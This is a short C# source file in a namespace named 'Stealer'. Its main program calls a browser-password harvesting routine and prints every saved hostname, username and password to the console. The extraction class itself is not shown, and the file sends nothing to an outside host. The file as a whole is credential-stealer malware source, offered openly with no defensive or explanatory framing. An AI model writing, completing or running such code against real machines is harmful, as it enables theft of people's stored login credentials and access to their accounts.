using System;

namespace Stealer
{
    class Program
    {
        static void Main(string[] args)
        {

            foreach (string[] data in Browsers.getPasswords()) {

                /*
                 
                 hostname - data[0]
                 username - data[1]
                 password - data[2]

                 */

                Console.WriteLine("\n[DATA]\nHostname: " + data[0] + "\nUsername: " + data[1] + "\nPassword: " + data[2]);
            }

            // Wait
            Console.ReadLine();

        }
    }   
}